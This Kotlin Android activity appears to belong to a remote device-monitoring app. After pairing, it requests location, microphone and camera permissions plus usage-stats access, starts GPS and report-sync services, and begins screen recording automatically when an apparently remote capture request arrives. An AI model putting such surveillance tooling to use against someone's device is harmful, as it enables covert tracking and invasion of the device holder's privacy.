package com.nexora.miro

import android.Manifest
import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.media.projection.MediaProjectionManager
import android.os.Build
import android.os.Bundle
import android.os.Handler
import android.os.Looper
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat
import androidx.core.content.ContextCompat
import com.nexora.miro.databinding.ActivityMainBinding
import com.nexora.miro.services.LocationService
import com.nexora.miro.services.ScreenCaptureService
import com.nexora.miro.services.SyncWorker

class MainActivity : AppCompatActivity() {
    private lateinit var b: ActivityMainBinding
    private val PERMISSION_CODE = 101

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        Prefs.init(this)
        if (!Prefs.paired) { startActivity(Intent(this, PairingActivity::class.java)); finish(); return }
        
        b = ActivityMainBinding.inflate(layoutInflater)
        setContentView(b.root)
        b.tvStatus.text = "Connecté — Appareil: ${Prefs.deviceId}"
        
        checkAndRequestPermissions()

        b.btnUnpair.setOnClickListener { Prefs.clear(); startActivity(Intent(this, PairingActivity::class.java)); finish() }

        if (intent?.action == "REQUEST_SCREEN_CAPTURE") {
            requestScreenCapture()
        }
    }

    override fun onNewIntent(intent: Intent?) {
        super.onNewIntent(intent)
        if (intent?.action == "REQUEST_SCREEN_CAPTURE") {
            requestScreenCapture()
        }
    }

    private fun checkAndRequestPermissions() {
        val permissions = mutableListOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION,
            Manifest.permission.RECORD_AUDIO,
            Manifest.permission.CAMERA
        )
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            permissions.add(Manifest.permission.POST_NOTIFICATIONS)
        }

        val needed = permissions.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
        if (needed.isNotEmpty()) {
            ActivityCompat.requestPermissions(this, needed.toTypedArray(), PERMISSION_CODE)
        } else {
            startBackgroundServices()
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.LOLLIPOP_MR1) {
            val appOps = getSystemService(Context.APP_OPS_SERVICE) as android.app.AppOpsManager
            val mode = appOps.checkOpNoThrow(android.app.AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), packageName)
            if (mode != android.app.AppOpsManager.MODE_ALLOWED) {
                startActivity(Intent(android.provider.Settings.ACTION_USAGE_ACCESS_SETTINGS))
            }
        }
    }

    override fun onRequestPermissionsResult(requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == PERMISSION_CODE) startBackgroundServices()
    }

    private fun startBackgroundServices() {
        // Lancer GPS
        val locIntent = Intent(this, LocationService::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(locIntent) else startService(locIntent)

        // Lancer Sync (Rapports)
        val syncIntent = Intent(this, SyncWorker::class.java)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(syncIntent) else startService(syncIntent)
    }

    private fun requestScreenCapture() {
        val projectionManager = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
        startActivityForResult(projectionManager.createScreenCaptureIntent(), 100)
    }

    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
        super.onActivityResult(requestCode, resultCode, data)
        if (requestCode == 100 && resultCode == Activity.RESULT_OK) {
            val intent = Intent(this, ScreenCaptureService::class.java)
            intent.action = "START_PROJECTION"
            intent.putExtra("resultCode", resultCode)
            intent.putExtra("data", data)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) startForegroundService(intent) else startService(intent)
            
            Handler(Looper.getMainLooper()).postDelayed({
                val recordIntent = Intent(this, ScreenCaptureService::class.java)
                recordIntent.action = "RECORD_NOW"
                startService(recordIntent)
            }, 1000)
        }
    }
}